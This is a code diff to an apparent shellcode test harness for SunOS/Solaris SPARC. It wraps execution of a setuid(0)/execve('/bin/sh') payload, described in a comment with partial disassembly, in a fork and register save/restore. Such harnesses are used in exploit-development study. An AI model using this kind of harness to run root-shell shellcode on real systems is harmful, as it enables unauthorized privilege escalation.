@@ -5,8 +5,12 @@
 #include <strings.h>
 #endif
 
+#include <sys/types.h>
 #include <sys/utsname.h>
+#include <sys/wait.h>
 #include <unistd.h>
+
+#include "regs/state.h"
 
 /*
  * SunOS (Solaris) / (sun4u / sparc32) setuid(0) + execve("/bin/sh", {"/bin/sh", NULL}, NULL)
@@ -43,7 +47,7 @@
  * 100c8: 82 10 20 3b   mov  0x3b, %g1
  * 100cc: 91 d0 20 10   ta  0x10
  */
-
+ 
 #ifndef __sect_shellcode
 #define __sect_shellcode __attribute__((section(".sect.shellcode")))
 #endif
@@ -81,7 +85,8 @@ int __unsafe main(int argc, char **argv) {
   unused(argc);
   unused(argv);
 
-  int ret;
+  int ret, wstatus;
+  pid_t pid;
   struct utsname uts;
 
   // add 2 unused parameters to make
@@ -104,10 +109,31 @@ int __unsafe main(int argc, char **argv) {
 
   trigger = (void (*)(int, int))shellcode;
 
-  printf("[*] Executing the shellcode..\n");
-  trigger(0, 0);
+  printf("[*] Saving register state..\n");
+  save_regs(&__serialize_regs(cregs));
+
+  pid = fork();
+
+  if (pid < 0) {
+    perror("fork()");
+    ret = pid;
+    goto __must_restore_regs;
+  }
+
+  if (!pid) {
+    printf("[*] Executing the shellcode..\n");
+    trigger(0, 0);
+  } else {
+    waitpid(-1, &wstatus, 0);
+  }
+
+  printf("[*] Restoring register state..\n");
+  store_regs(&__serialize_regs(cregs));
 
   return 0;
+
+__must_restore_regs:
+  store_regs(&__serialize_regs(cregs));
 
 __fallback:
   return ret;
